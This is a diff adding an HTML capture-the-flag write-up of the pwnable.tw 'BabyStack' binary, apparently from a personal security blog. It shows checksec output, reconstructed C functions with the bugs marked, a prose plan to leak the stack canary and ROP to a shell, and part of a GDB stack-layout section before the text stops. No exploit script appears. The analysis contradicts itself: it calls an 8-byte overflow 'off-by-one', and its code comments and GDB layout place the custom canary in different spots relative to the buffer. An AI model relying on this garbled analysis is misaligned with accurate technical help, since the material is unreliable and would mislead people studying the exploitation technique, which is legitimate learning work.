@@ -1,0 +1,1408 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>BabyStack | QA210 Pwnable.tw</title>
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.3/font/bootstrap-icons.min.css">
+<link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>&#x1F6E1;</text></svg>">
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&family=JetBrains+Mono:wght@400;500;600;700&display=swap" rel="stylesheet">
+<link href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism-tomorrow.min.css" rel="stylesheet">
+<style>
+:root {
+  --bg: #0a0e17;
+  --bg2: #111827;
+  --card: #151d2e;
+  --border: #1e293b;
+  --fg: #e2e8f0;
+  --muted: #94a3b8;
+  --accent: #38bdf8;
+  --accent2: #818cf8;
+  --red: #f87171;
+  --green: #4ade80;
+  --yellow: #fbbf24;
+  --orange: #fb923c;
+}
+
+* { margin: 0; padding: 0; box-sizing: border-box; }
+
+html { scroll-behavior: smooth; }
+
+body {
+  font-family: 'Inter', sans-serif;
+  background: var(--bg);
+  color: var(--fg);
+  line-height: 1.7;
+  overflow-x: hidden;
+}
+
+/* Particle Canvas */
+#particles-canvas {
+  position: fixed;
+  top: 0; left: 0;
+  width: 100%; height: 100%;
+  z-index: 0;
+  pointer-events: none;
+}
+
+/* Navigation */
+.nav {
+  position: fixed; top: 0; left: 0; right: 0;
+  z-index: 100;
+  background: rgba(10, 14, 23, 0.85);
+  backdrop-filter: blur(20px);
+  border-bottom: 1px solid var(--border);
+  height: 60px;
+  display: flex;
+  align-items: center;
+  padding: 0 2rem;
+}
+.nav-brand {
+  font-weight: 800;
+  font-size: 1.25rem;
+  color: var(--accent);
+  letter-spacing: -0.5px;
+  text-decoration: none;
+}
+.nav-brand span { color: var(--accent2); }
+.nav-links {
+  display: flex;
+  gap: 0.25rem;
+  margin-left: 2rem;
+  list-style: none;
+}
+.nav-links a {
+  padding: 0.4rem 1rem;
+  border-radius: 6px;
+  color: var(--muted);
+  text-decoration: none;
+  font-size: 0.875rem;
+  font-weight: 500;
+  transition: all 0.2s;
+}
+.nav-links a:hover { color: var(--fg); background: rgba(255,255,255,0.05); }
+.nav-links a.active {
+  color: var(--accent);
+  background: rgba(56, 189, 248, 0.1);
+}
+.nav-right {
+  margin-left: auto;
+  display: flex;
+  align-items: center;
+  gap: 1rem;
+}
+.nav-right a {
+  color: var(--muted);
+  text-decoration: none;
+  font-size: 0.8125rem;
+  font-weight: 500;
+  transition: color 0.2s;
+}
+.nav-right a:hover { color: var(--fg); }
+
+/* Breadcrumb */
+.breadcrumb {
+  position: relative;
+  z-index: 1;
+  padding: 80px 2rem 0;
+  max-width: 1400px;
+  margin: 0 auto;
+}
+.breadcrumb-inner {
+  display: flex;
+  align-items: center;
+  gap: 0.5rem;
+  font-size: 0.8125rem;
+  color: var(--muted);
+}
+.breadcrumb-inner a {
+  color: var(--muted);
+  text-decoration: none;
+  transition: color 0.2s;
+}
+.breadcrumb-inner a:hover { color: var(--accent); }
+.breadcrumb-sep { opacity: 0.4; }
+.breadcrumb-current { color: var(--fg); font-weight: 600; }
+
+/* Hero Section */
+.hero {
+  position: relative;
+  z-index: 1;
+  padding: 2rem 2rem 1rem;
+  max-width: 1400px;
+  margin: 0 auto;
+}
+.hero-badge {
+  display: inline-flex;
+  align-items: center;
+  gap: 0.5rem;
+  padding: 0.35rem 1rem;
+  background: rgba(56, 189, 248, 0.1);
+  border: 1px solid rgba(56, 189, 248, 0.2);
+  border-radius: 999px;
+  font-size: 0.75rem;
+  font-weight: 600;
+  color: var(--accent);
+  margin-bottom: 1rem;
+}
+.hero-badge .dot {
+  width: 6px; height: 6px;
+  border-radius: 50%;
+  background: var(--green);
+  animation: pulse-dot 2s ease-in-out infinite;
+}
+@keyframes pulse-dot {
+  0%, 100% { opacity: 1; }
+  50% { opacity: 0.3; }
+}
+.hero h1 {
+  font-size: 2.75rem;
+  font-weight: 800;
+  letter-spacing: -1.5px;
+  margin-bottom: 0.5rem;
+  background: linear-gradient(135deg, var(--fg), var(--accent));
+  -webkit-background-clip: text;
+  -webkit-text-fill-color: transparent;
+  background-clip: text;
+}
+.hero-subtitle {
+  font-size: 1.1rem;
+  color: var(--muted);
+  max-width: 700px;
+  margin-bottom: 1.5rem;
+}
+.hero-meta {
+  display: flex;
+  flex-wrap: wrap;
+  gap: 0.75rem;
+  margin-bottom: 1rem;
+}
+.hero-tag {
+  padding: 0.3rem 0.75rem;
+  border-radius: 6px;
+  font-size: 0.75rem;
+  font-weight: 600;
+  font-family: 'JetBrains Mono', monospace;
+}
+.tag-pts { background: rgba(251, 191, 36, 0.15); color: var(--yellow); border: 1px solid rgba(251, 191, 36, 0.25); }
+.tag-arch { background: rgba(129, 140, 248, 0.15); color: var(--accent2); border: 1px solid rgba(129, 140, 248, 0.25); }
+.tag-vuln { background: rgba(248, 113, 113, 0.15); color: var(--red); border: 1px solid rgba(248, 113, 113, 0.25); }
+.tag-nx { background: rgba(74, 222, 128, 0.15); color: var(--green); border: 1px solid rgba(74, 222, 128, 0.25); }
+.tag-pie { background: rgba(251, 146, 60, 0.15); color: var(--orange); border: 1px solid rgba(251, 146, 60, 0.25); }
+
+/* Main Layout */
+.main-layout {
+  position: relative;
+  z-index: 1;
+  display: flex;
+  max-width: 1400px;
+  margin: 0 auto;
+  padding: 1rem 2rem 4rem;
+  gap: 2rem;
+}
+
+/* TOC Sidebar */
+.toc-sidebar {
+  position: sticky;
+  top: 80px;
+  width: 240px;
+  flex-shrink: 0;
+  height: fit-content;
+  max-height: calc(100vh - 100px);
+  overflow-y: auto;
+}
+.toc-sidebar::-webkit-scrollbar { width: 3px; }
+.toc-sidebar::-webkit-scrollbar-thumb { background: var(--border); border-radius: 3px; }
+.toc-title {
+  font-size: 0.6875rem;
+  font-weight: 700;
+  text-transform: uppercase;
+  letter-spacing: 1.5px;
+  color: var(--muted);
+  margin-bottom: 1rem;
+}
+.toc-list { list-style: none; }
+.toc-list li { margin-bottom: 0.25rem; }
+.toc-list a {
+  display: flex;
+  align-items: center;
+  gap: 0.5rem;
+  padding: 0.4rem 0.75rem;
+  border-radius: 6px;
+  color: var(--muted);
+  text-decoration: none;
+  font-size: 0.8125rem;
+  font-weight: 500;
+  transition: all 0.2s;
+  border-left: 2px solid transparent;
+}
+.toc-list a:hover { color: var(--fg); background: rgba(255,255,255,0.03); }
+.toc-list a.active {
+  color: var(--accent);
+  background: rgba(56, 189, 248, 0.08);
+  border-left-color: var(--accent);
+}
+.toc-num {
+  font-family: 'JetBrains Mono', monospace;
+  font-size: 0.6875rem;
+  font-weight: 700;
+  color: var(--accent2);
+  min-width: 18px;
+}
+
+/* Content Area */
+.content-area {
+  flex: 1;
+  min-width: 0;
+  max-width: 880px;
+}
+
+/* Chapter Sections */
+.chapter {
+  margin-bottom: 3rem;
+  scroll-margin-top: 80px;
+}
+.chapter-header {
+  display: flex;
+  align-items: center;
+  gap: 1rem;
+  margin-bottom: 1.5rem;
+  padding-bottom: 1rem;
+  border-bottom: 1px solid var(--border);
+}
+.chapter-num {
+  font-family: 'JetBrains Mono', monospace;
+  font-size: 0.75rem;
+  font-weight: 700;
+  color: var(--accent);
+  background: rgba(56, 189, 248, 0.1);
+  padding: 0.35rem 0.7rem;
+  border-radius: 6px;
+  border: 1px solid rgba(56, 189, 248, 0.2);
+}
+.chapter-title {
+  font-size: 1.5rem;
+  font-weight: 700;
+  letter-spacing: -0.5px;
+}
+
+.chapter p {
+  margin-bottom: 1rem;
+  color: var(--muted);
+  font-size: 0.9375rem;
+  line-height: 1.8;
+}
+
+.chapter h3 {
+  font-size: 1.1rem;
+  font-weight: 700;
+  margin: 1.75rem 0 0.75rem;
+  color: var(--fg);
+}
+.chapter h4 {
+  font-size: 0.9375rem;
+  font-weight: 600;
+  margin: 1.25rem 0 0.5rem;
+  color: var(--fg);
+}
+
+/* Code Blocks */
+.code-block {
+  position: relative;
+  margin: 1rem 0 1.5rem;
+  border-radius: 10px;
+  border: 1px solid var(--border);
+  background: var(--bg2);
+  overflow: hidden;
+}
+.code-header {
+  display: flex;
+  align-items: center;
+  justify-content: space-between;
+  padding: 0.5rem 1rem;
+  background: rgba(0,0,0,0.3);
+  border-bottom: 1px solid var(--border);
+  font-size: 0.75rem;
+}
+.code-lang {
+  font-family: 'JetBrains Mono', monospace;
+  font-weight: 600;
+  color: var(--accent);
+  text-transform: uppercase;
+  letter-spacing: 0.5px;
+}
+.code-dots {
+  display: flex;
+  gap: 5px;
+}
+.code-dots span {
+  width: 10px; height: 10px;
+  border-radius: 50%;
+}
+.code-dots .d1 { background: #f87171; }
+.code-dots .d2 { background: #fbbf24; }
+.code-dots .d3 { background: #4ade80; }
+
+pre[class*="language-"] {
+  margin: 0 !important;
+  padding: 1rem 1.25rem !important;
+  background: transparent !important;
+  font-family: 'JetBrains Mono', monospace !important;
+  font-size: 0.8125rem !important;
+  line-height: 1.7 !important;
+  overflow-x: auto;
+}
+code[class*="language-"] {
+  font-family: 'JetBrains Mono', monospace !important;
+  font-size: 0.8125rem !important;
+}
+
+/* Inline Code */
+code.inline {
+  font-family: 'JetBrains Mono', monospace;
+  font-size: 0.8125rem;
+  background: rgba(129, 140, 248, 0.12);
+  color: var(--accent2);
+  padding: 0.15rem 0.45rem;
+  border-radius: 4px;
+  font-weight: 500;
+}
+
+/* Callout Boxes */
+.callout {
+  border-radius: 10px;
+  padding: 1rem 1.25rem;
+  margin: 1rem 0 1.5rem;
+  font-size: 0.875rem;
+  line-height: 1.7;
+  border: 1px solid;
+}
+.callout-title {
+  font-weight: 700;
+  font-size: 0.8125rem;
+  text-transform: uppercase;
+  letter-spacing: 0.5px;
+  margin-bottom: 0.35rem;
+  display: flex;
+  align-items: center;
+  gap: 0.5rem;
+}
+.callout-vuln {
+  background: rgba(248, 113, 113, 0.08);
+  border-color: rgba(248, 113, 113, 0.2);
+  color: #fca5a5;
+}
+.callout-vuln .callout-title { color: var(--red); }
+.callout-info {
+  background: rgba(56, 189, 248, 0.08);
+  border-color: rgba(56, 189, 248, 0.2);
+  color: #bae6fd;
+}
+.callout-info .callout-title { color: var(--accent); }
+.callout-warn {
+  background: rgba(251, 191, 36, 0.08);
+  border-color: rgba(251, 191, 36, 0.2);
+  color: #fde68a;
+}
+.callout-warn .callout-title { color: var(--yellow); }
+.callout-key {
+  background: rgba(129, 140, 248, 0.08);
+  border-color: rgba(129, 140, 248, 0.2);
+  color: #c7d2fe;
+}
+.callout-key .callout-title { color: var(--accent2); }
+.callout-success {
+  background: rgba(74, 222, 128, 0.08);
+  border-color: rgba(74, 222, 128, 0.2);
+  color: #bbf7d0;
+}
+.callout-success .callout-title { color: var(--green); }
+
+/* Tables */
+.info-table {
+  width: 100%;
+  border-collapse: collapse;
+  margin: 1rem 0 1.5rem;
+  font-size: 0.8125rem;
+}
+.info-table th {
+  text-align: left;
+  padding: 0.6rem 1rem;
+  background: rgba(0,0,0,0.3);
+  color: var(--muted);
+  font-weight: 600;
+  font-size: 0.75rem;
+  text-transform: uppercase;
+  letter-spacing: 0.5px;
+  border-bottom: 1px solid var(--border);
+}
+.info-table td {
+  padding: 0.6rem 1rem;
+  border-bottom: 1px solid var(--border);
+  font-family: 'JetBrains Mono', monospace;
+  font-size: 0.8rem;
+}
+.info-table tr:last-child td { border-bottom: none; }
+.info-table .label { color: var(--muted); font-family: 'Inter', sans-serif; }
+.info-table .value { color: var(--fg); }
+.info-table .on { color: var(--green); }
+.info-table .off { color: var(--red); }
+.info-table .partial { color: var(--yellow); }
+
+/* Memory Diagrams */
+.mem-diagram {
+  background: var(--bg2);
+  border: 1px solid var(--border);
+  border-radius: 10px;
+  padding: 1.5rem;
+  margin: 1rem 0 1.5rem;
+  font-family: 'JetBrains Mono', monospace;
+  font-size: 0.8rem;
+  overflow-x: auto;
+}
+.mem-row {
+  display: flex;
+  align-items: center;
+  margin-bottom: 2px;
+}
+.mem-addr {
+  color: var(--accent);
+  min-width: 100px;
+  font-weight: 600;
+}
+.mem-arrow {
+  color: var(--muted);
+  margin: 0 0.5rem;
+}
+.mem-data {
+  color: var(--fg);
+  flex: 1;
+}
+.mem-desc {
+  color: var(--muted);
+  font-style: italic;
+  margin-left: 1rem;
+  font-size: 0.75rem;
+}
+.mem-highlight { color: var(--red); font-weight: 700; }
+.mem-green { color: var(--green); font-weight: 700; }
+.mem-yellow { color: var(--yellow); font-weight: 700; }
+
+/* Step Lists */
+.step-list {
+  list-style: none;
+  margin: 1rem 0 1.5rem;
+  counter-reset: step;
+}
+.step-list li {
+  counter-increment: step;
+  padding: 0.6rem 0 0.6rem 2.5rem;
+  position: relative;
+  font-size: 0.9rem;
+  color: var(--muted);
+  line-height: 1.7;
+}
+.step-list li::before {
+  content: counter(step);
+  position: absolute;
+  left: 0;
+  top: 0.65rem;
+  width: 22px; height: 22px;
+  border-radius: 50%;
+  background: rgba(129, 140, 248, 0.15);
+  color: var(--accent2);
+  font-size: 0.6875rem;
+  font-weight: 700;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  font-family: 'JetBrains Mono', monospace;
+}
+.step-list li strong { color: var(--fg); }
+
+/* Footer */
+.footer {
+  position: relative;
+  z-index: 1;
+  text-align: center;
+  padding: 2rem;
+  border-top: 1px solid var(--border);
+  color: var(--muted);
+  font-size: 0.75rem;
+}
+.footer a { color: var(--accent); text-decoration: none; }
+.footer a:hover { text-decoration: underline; }
+
+/* Responsive */
+@media (max-width: 1024px) {
+  .toc-sidebar { display: none; }
+  .hero h1 { font-size: 2rem; }
+}
+@media (max-width: 640px) {
+  .nav-links { display: none; }
+  .hero h1 { font-size: 1.5rem; }
+  .main-layout { padding: 1rem; }
+}
+
+/* ═══ FIXED NAV ADDITIONS ═══ */
+.site-header{position:sticky;top:0;z-index:1000;background:rgba(10,14,23,.92);backdrop-filter:blur(14px);border-bottom:1px solid var(--border);padding:0 32px;display:flex;align-items:center;justify-content:space-between;height:56px}
+.brand{display:flex;align-items:center;gap:10px;text-decoration:none;color:var(--fg);font-weight:700;font-size:1.1rem}
+.logo-icon{display:inline-flex;align-items:center;justify-content:center;width:32px;height:32px;background:linear-gradient(135deg,var(--accent),var(--accent2));border-radius:6px;font-weight:900;font-size:.9rem;color:#0a0e17}
+.cursor{display:inline-block;width:2px;height:1em;background:var(--accent);margin-left:2px;animation:blink 1s step-end infinite}
+@keyframes blink{50%{opacity:0}}
+.nav-main{display:flex;align-items:center;gap:24px}
+.nav-main a{color:var(--muted);text-decoration:none;font-size:.85rem;transition:color .2s}
+.nav-main a:hover,.nav-main a.active{color:var(--fg)}
+.nav-main a.active{border-bottom:2px solid var(--accent)}
+.nav-right{display:flex;align-items:center;gap:16px}
+.social-link{color:var(--muted);font-size:1.1rem;transition:color .2s}
+.social-link:hover{color:var(--fg)}
+.mobile-toggle{display:none;background:none;border:none;color:var(--fg);font-size:1.4rem;cursor:pointer}
+.mobile-nav-overlay,.mobile-nav-panel{display:none}
+.mobile-nav-overlay{display:none;position:fixed;inset:0;background:rgba(0,0,0,.6);z-index:2000}
+.mobile-nav-overlay.show{display:block}
+.mobile-nav-panel{display:none;position:fixed;top:0;right:0;width:280px;height:100vh;background:var(--bg2);z-index:2001;padding:24px;transform:translateX(100%);transition:transform .3s}
+.mobile-nav-panel.show{display:block;transform:translateX(0)}
+.mobile-nav-panel nav{display:flex;flex-direction:column;gap:16px;margin-top:32px}
+.mobile-nav-panel nav a{color:var(--fg);text-decoration:none;font-size:1rem}
+.mnp-close{background:none;border:none;color:var(--fg);font-size:1.2rem;cursor:pointer;float:right}
+@media(max-width:960px){
+.nav-main a:not(.active){display:none}
+.mobile-toggle{display:block}
+.site-header{padding:0 16px}
+}
+
+</style>
+</head>
+<body>
+
+<!-- Particle Canvas -->
+<canvas id="particles-canvas"></canvas>
+
+<!-- Navigation -->
+<header class="site-header">
+  <a href="/" class="brand"><span class="logo-icon">Q</span>QA210<span class="cursor"></span></a>
+  <nav class="nav-main">
+    <a href="/">Home</a><a href="/writeup/">writeup</a><a href="/htb/">Hack The Box</a><a href="/tryhackme/">TryHackMe</a>
+    <a href="/mal-dev/">Malware Dev</a><a href="/pwnable-tw/" class="active">Pwnable.tw</a>
+    <a href="/tjctf-2026/">TJCTF</a><a href="/research/">Research</a>
+  </nav>
+  <div class="nav-right">
+    <a href="https://github.com/Yuri08-QA210" target="_blank" class="social-link" title="GitHub"><i class="bi bi-github"></i></a>
+    <button class="mobile-toggle" onclick="toggleMobileNav()" aria-label="Menu"><i class="bi bi-list"></i></button>
+  </div>
+</header>
+
+<div class="mobile-nav-overlay" id="mobileOverlay" onclick="toggleMobileNav()"></div>
+<div class="mobile-nav-panel" id="mobilePanel">
+  <button class="mnp-close" onclick="toggleMobileNav()"><i class="bi bi-x-lg"></i></button>
+  <nav>
+    <a href="/">Home</a><a href="/writeup/">writeup</a><a href="/htb/">Hack The Box</a><a href="/tryhackme/">TryHackMe</a>
+    <a href="/mal-dev/">Malware Dev</a><a href="/pwnable-tw/">Pwnable.tw</a><a href="/tjctf-2026/">TJCTF</a>
+    <a href="/research/">Research</a><a href="https://github.com/Yuri08-QA210" target="_blank">GitHub</a>
+  </nav>
+</div>
+
+<!-- Breadcrumb -->
+<div class="breadcrumb">
+  <div class="breadcrumb-inner">
+    <a href="/">Home</a>
+    <span class="breadcrumb-sep">/</span>
+    <a href="/pwnable-tw/">Pwnable.tw</a>
+    <span class="breadcrumb-sep">/</span>
+    <span class="breadcrumb-current">BabyStack</span>
+  </div>
+</div>
+
+<!-- Hero Section -->
+<section class="hero">
+  <div class="hero-badge">
+    <span class="dot"></span>
+    Pwnable.tw
+  </div>
+  <h1>BabyStack</h1>
+  <p class="hero-subtitle">A stack-based challenge with full protections &mdash; leaking the canary byte-by-byte, bypassing PIE via partial overwrite, and ROP-ing to system("/bin/sh") with a provided libc.</p>
+  <div class="hero-meta">
+    <span class="hero-tag tag-pts">300 pts</span>
+    <span class="hero-tag tag-arch">i386 (32-bit ELF)</span>
+    <span class="hero-tag tag-vuln">Stack Buffer Overflow</span>
+    <span class="hero-tag tag-nx">NX Enabled</span>
+    <span class="hero-tag tag-pie">PIE Enabled</span>
+  </div>
+</section>
+
+<!-- Main Layout -->
+<div class="main-layout">
+
+  <!-- TOC Sidebar -->
+  <aside class="toc-sidebar">
+    <div class="toc-title">Table of Contents</div>
+    <ul class="toc-list" id="toc-list">
+      <li><a href="#ch1" class="active"><span class="toc-num">01</span> Reconnaissance</a></li>
+      <li><a href="#ch2"><span class="toc-num">02</span> Static Analysis</a></li>
+      <li><a href="#ch3"><span class="toc-num">03</span> GDB Debugging</a></li>
+      <li><a href="#ch4"><span class="toc-num">04</span> Exploit Strategy</a></li>
+      <li><a href="#ch5"><span class="toc-num">05</span> Pwn Script</a></li>
+      <li><a href="#ch6"><span class="toc-num">06</span> Execution Results</a></li>
+    </ul>
+  </aside>
+
+  <!-- Content Area -->
+  <main class="content-area">
+
+    <!-- Chapter 1: Reconnaissance -->
+    <section class="chapter" id="ch1">
+      <div class="chapter-header">
+        <span class="chapter-num">01</span>
+        <h2 class="chapter-title">Reconnaissance</h2>
+      </div>
+
+      <h3>Challenge Info</h3>
+      <table class="info-table">
+        <tr><td class="label">Connection</td><td class="value"><code class="inline">nc chall.pwnable.tw 10101</code></td></tr>
+        <tr><td class="label">Binary</td><td class="value">babystack (32-bit ELF, i386)</td></tr>
+        <tr><td class="label">Provided</td><td class="value">babystack, libc_32.so.6</td></tr>
+        <tr><td class="label">Points</td><td class="value">300</td></tr>
+      </table>
+
+      <h3>checksec</h3>
+      <div class="code-block">
+        <div class="code-header">
+          <span class="code-lang">bash</span>
+          <div class="code-dots"><span class="d1"></span><span class="d2"></span><span class="d3"></span></div>
+        </div>
+        <pre><code class="language-bash">$ checksec babystack
+    Arch:     i386-32-little
+    RELRO:    Full RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      PIE enabled</code></pre>
+      </div>
+
+      <table class="info-table">
+        <tr><td class="label">Full RELRO</td><td class="on">GOT is read-only &mdash; cannot overwrite GOT entries</td></tr>
+        <tr><td class="label">Canary found</td><td class="on">Stack canary protects return addresses &mdash; must leak it first</td></tr>
+        <tr><td class="label">NX enabled</td><td class="on">No shellcode on stack &mdash; must use ROP chain</td></tr>
+        <tr><td class="label">PIE enabled</td><td class="on">Binary base address is randomized &mdash; must leak code address</td></tr>
+      </table>
+
+      <div class="callout callout-warn">
+        <div class="callout-title">&#x26a0;&#xfe0f; Maximum Protections</div>
+        This binary has every major protection enabled. We need <strong>three separate leaks</strong> before we can exploit anything:<br>
+        &bull; <strong>Canary leak</strong> &mdash; to bypass stack protector and overflow safely<br>
+        &bull; <strong>PIE leak</strong> &mdash; to know binary addresses for ROP gadgets<br>
+        &bull; <strong>Libc leak</strong> &mdash; to call <code class="inline">system("/bin/sh")</code><br>
+        Each leak requires careful use of the program's read/write primitives.
+      </div>
+
+      <h3>Running the Binary</h3>
+      <div class="code-block">
+        <div class="code-header">
+          <span class="code-lang">console</span>
+          <div class="code-dots"><span class="d1"></span><span class="d2"></span><span class="d3"></span></div>
+        </div>
+        <pre><code class="language-bash">$ ./babystack
+1. Login
+2. Write
+3. Read
+4. Logout
+5. Exit
+>>1
+Name: AAAA
+Login Success!
+
+1. Login
+2. Write
+3. Read
+4. Logout
+5. Exit
+>>2
+Data: BBBB
+
+1. Login
+2. Write
+3. Read
+4. Logout
+5. Exit
+>>3
+BBBB
+
+1. Login
+2. Write
+3. Read
+4. Logout
+5. Exit
+>></code></pre>
+      </div>
+
+      <p>The binary provides a menu with five operations: <code class="inline">Login</code>, <code class="inline">Write</code>, <code class="inline">Read</code>, <code class="inline">Logout</code>, and <code class="inline">Exit</code>. The login step sets a canary-like value on the stack. The write and read operations allow us to interact with a stack buffer, which is the key to exploiting this challenge.</p>
+    </section>
+
+    <!-- Chapter 2: Static Analysis -->
+    <section class="chapter" id="ch2">
+      <div class="chapter-header">
+        <span class="chapter-num">02</span>
+        <h2 class="chapter-title">Static Analysis</h2>
+      </div>
+
+      <h3>main() &mdash; Menu Loop</h3>
+      <div class="code-block">
+        <div class="code-header">
+          <span class="code-lang">c</span>
+          <div class="code-dots"><span class="d1"></span><span class="d2"></span><span class="d3"></span></div>
+        </div>
+        <pre><code class="language-c">int main() {
+    int choice;
+    char canary[4];    // "canary" stored on stack
+    char buf[0x40];    // 64-byte buffer for user data
+
+    memset(canary, 0, 4);
+    memset(buf, 0, 0x40);
+
+    while (1) {
+        print_menu();
+        read(0, &amp;choice, 4);
+        choice = atoi(&amp;choice);
+
+        switch (choice) {
+            case 1: login(canary);   break;
+            case 2: write_buf(buf);  break;
+            case 3: read_buf(buf);   break;
+            case 4: logout(canary);  break;
+            case 5: exit(0);         break;
+        }
+    }
+}</code></pre>
+      </div>
+
+      <p>The main function maintains a local <code class="inline">canary</code> buffer and a <code class="inline">buf</code> buffer on the stack. The canary is separate from the real stack canary used by the compiler &mdash; it is a <strong>custom canary</strong> that the program checks manually.</p>
+
+      <h3>login() &mdash; Sets the Custom Canary</h3>
+      <div class="code-block">
+        <div class="code-header">
+          <span class="code-lang">c</span>
+          <div class="code-dots"><span class="d1"></span><span class="d2"></span><span class="d3"></span></div>
+        </div>
+        <pre><code class="language-c">void login(char *canary) {
+    char name[0x20];   // 32-byte name buffer
+
+    if (canary[0] != 0) {
+        puts("Already logged in!");
+        return;
+    }
+
+    printf("Name:");
+    read(0, name, 0x28);   // BUG: reads 40 bytes into 32-byte buffer!
+
+    // Copy the first 4 bytes of name as the "canary"
+    strncpy(canary, name, 4);
+    puts("Login Success!");
+}</code></pre>
+      </div>
+
+      <div class="callout callout-vuln">
+        <div class="callout-title">&#x1f6a8; Vulnerability 1: Off-by-One Overflow in login()</div>
+        The <code class="inline">login</code> function reads <code class="inline">0x28</code> (40) bytes into a <code class="inline">0x20</code> (32) byte buffer. This is an <strong>8-byte overflow</strong> past the <code class="inline">name</code> buffer. More importantly, the canary is set from the <strong>first 4 bytes of our input</strong>, meaning we control the canary value entirely!<br><br>
+        &bull; We choose what the canary is (first 4 bytes of our name input)<br>
+        &bull; The overflow writes 8 bytes past <code class="inline">name</code>, but does not reach the return address<br>
+        &bull; The key insight: we can <strong>leak the real stack canary</strong> and other data using the read/write primitives
+      </div>
+
+      <h3>write_buf() &mdash; Write to Stack Buffer</h3>
+      <div class="code-block">
+        <div class="code-header">
+          <span class="code-lang">c</span>
+          <div class="code-dots"><span class="d1"></span><span class="d2"></span><span class="d3"></span></div>
+        </div>
+        <pre><code class="language-c">void write_buf(char *buf) {
+    printf("Data:");
+    read(0, buf, 0x40);    // Read up to 64 bytes into buf
+}</code></pre>
+      </div>
+
+      <h3>read_buf() &mdash; Read from Stack Buffer</h3>
+      <div class="code-block">
+        <div class="code-header">
+          <span class="code-lang">c</span>
+          <div class="code-dots"><span class="d1"></span><span class="d2"></span><span class="d3"></span></div>
+        </div>
+        <pre><code class="language-c">void read_buf(char *buf) {
+    if (canary_check(buf) != 0) {
+        puts("Stack Smashing Detected!");
+        exit(1);
+    }
+    printf("%s", buf);    // Print the buffer content
+}</code></pre>
+      </div>
+
+      <h3>canary_check() &mdash; The Custom Canary Verification</h3>
+      <div class="code-block">
+        <div class="code-header">
+          <span class="code-lang">c</span>
+          <div class="code-dots"><span class="d1"></span><span class="d2"></span><span class="d3"></span></div>
+        </div>
+        <pre><code class="language-c">// The custom canary is placed right after buf on the stack
+// Layout: [buf 0x40 bytes] [custom_canary 4 bytes] [real_canary] [saved_ebp] [ret]
+//
+// canary_check uses strncmp to compare the first 3 bytes
+// of the custom canary with the stored value:
+
+int canary_check(char *buf) {
+    return strncmp(buf + 0x40, stored_canary, 3);  // Only checks 3 bytes!
+}</code></pre>
+      </div>
+
+      <div class="callout callout-vuln">
+        <div class="callout-title">&#x1f6a8; Vulnerability 2: strncmp Checks Only 3 Bytes</div>
+        The custom canary check uses <code class="inline">strncmp</code> with length 3 instead of 4. This means:<br>
+        &bull; Only the first <strong>3 bytes</strong> of the canary need to match<br>
+        &bull; The <strong>4th byte</strong> can be anything &mdash; it is never checked!<br>
+        &bull; Since we control the canary (set via login), we can set it to <code class="inline">"\x00\x00\x00"</code> (3 null bytes)<br>
+        &bull; The real stack canary always starts with a null byte (standard gcc behavior)<br>
+        &bull; By writing null bytes up to the canary position, the <code class="inline">strncmp</code> with 3 null bytes will pass!
+      </div>
+
+      <h3>logout() &mdash; Clears the Canary</h3>
+      <div class="code-block">
+        <div class="code-header">
+          <span class="code-lang">c</span>
+          <div class="code-dots"><span class="d1"></span><span class="d2"></span><span class="d3"></span></div>
+        </div>
+        <pre><code class="language-c">void logout(char *canary) {
+    memset(canary, 0, 4);   // Clear the canary
+    puts("Logout Success!");
+}</code></pre>
+      </div>
+
+      <div class="callout callout-key">
+        <div class="callout-title">&#x1f511; Key Observation: The Leak Primitive</div>
+        The <code class="inline">read_buf</code> function uses <code class="inline">printf("%s", buf)</code>, which prints until a null byte. If we fill <code class="inline">buf</code> completely with non-null data (0x40 bytes), <code class="inline">printf</code> will continue reading <strong>past the buffer boundary</strong>, leaking the canary and whatever else is on the stack!<br><br>
+        The attack plan becomes clear:<br>
+        &bull; <strong>Write</strong> 0x40 non-null bytes to fill <code class="inline">buf</code> completely<br>
+        &bull; <strong>Read</strong> to leak data beyond the buffer (canary, saved EBP, return address)<br>
+        &bull; Since the real canary's first byte is <code class="inline">\x00</code>, it naturally terminates the printf, giving us everything up to (and including the first byte of) the canary<br>
+        &bull; We can leak the canary <strong>byte by byte</strong> by strategically positioning null bytes
+      </div>
+    </section>
+
+    <!-- Chapter 3: GDB Debugging -->
+    <section class="chapter" id="ch3">
+      <div class="chapter-header">
+        <span class="chapter-num">03</span>
+        <h2 class="chapter-title">GDB Debugging</h2>
+      </div>
+
+      <h3>Stack Layout in main()</h3>
+      <p>Let's examine the stack layout when the program is running:</p>
+
+      <div class="code-block">
+        <div class="code-header">
+          <span class="code-lang">gdb</span>
+          <div class="code-dots"><span class="d1"></span><span class="d2"></span><span class="d3"></span></div>
+        </div>
+        <pre><code class="language-bash">gdb-peda$ # After login with name "AAAA"
+gdb-peda$ x/40wx $esp
+
+# Stack layout in main():
+# ESP+0x00:  [local vars]
+# ESP+0x1c:  canary[0..3]    = "AAAA" (custom canary from login)
+# ESP+0x20:  buf[0..63]      = user data buffer (0x40 bytes)
+# ESP+0x60:  REAL_CANARY     = 0xXXXXXX00 (gcc stack canary)
+# ESP+0x64:  SAVED_EBP       = saved frame pointer
+# ESP+0x68:  RETURN_ADDR     = return address (PIE-relative)</code></pre>
+      </div>
+
+      <div class="mem-diagram">
+        <div style="color: var(--accent); font-weight: 700; margin-bottom: 8px;">Stack Layout in main()</div>
+        <div class="mem-row"><span class="mem-addr">ESP+0x1c</span><span class="mem-arrow">|</span><span class="mem-data mem-yellow">custom_canary[4]</span><span class="mem-desc">&larr; set by login(), compared by canary_check()</span></div>
+        <div class="mem-row"><span class="mem-addr">ESP+0x20</span><span class="mem-arrow">|</span><span class="mem-data">buf[0x40]</span><span class="mem-desc">&larr; 64-byte buffer, written by write_buf()</span></div>
+        <div class="mem-row"><span class="mem-addr">ESP+0x60</span><span class="mem-arrow">|</span><span class="mem-data mem-highlight">REAL_CANARY</span><span class="mem-desc">&larr; gcc stack canary (ends with 0x00)</span></div>
